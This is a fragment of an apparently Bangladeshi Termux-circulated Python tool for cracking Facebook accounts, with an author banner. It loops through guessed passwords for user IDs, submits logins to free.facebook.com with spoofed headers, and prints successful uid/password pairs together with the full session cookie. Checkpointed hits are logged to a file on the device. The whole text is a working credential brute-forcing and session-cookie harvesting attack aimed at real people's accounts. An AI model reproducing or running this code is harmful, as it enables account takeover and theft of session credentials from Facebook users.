...
\033[1;36m═════════════════════════════════════════════════════════════
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MD SRABON 
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MD SRABON  
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MD ASHIKUR 
\033[1;36m =[GITHUB]=  \033[1;36m   \033[1;36mTERMUX-ASHIK
    ...
    try:
        for ps in pwx:
            ...
            'authority': 'free.facebook.com',
                ...
                'user-agent': 'pro',
                'viewport-width': '980',}
            lo = session.post('https://free.facebook.com/?stype=lo&deoia=1&jlou=Afe-EDVJvNxBgziQNtqiOEGNB9D-VMyfveFrLWRuMkfFcfNFZutYf8R1F_xOOz9RR9NZEMoOL-8XOa9_1IqvrTZWE17jg2OMJyJKn7m3i2cJlg&smuh=41759&lh=Ac9Nt4qc1gnDU2KOlbo&wtsid=rdr_0SuxBOUeMzyA5Kh6j&_rdr',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m=[ASHIK-OK💚]= {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m=[ASHIK-RJ💔]= {uid}|{ps}")
                open('/sdcard/ASHIK-LK.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
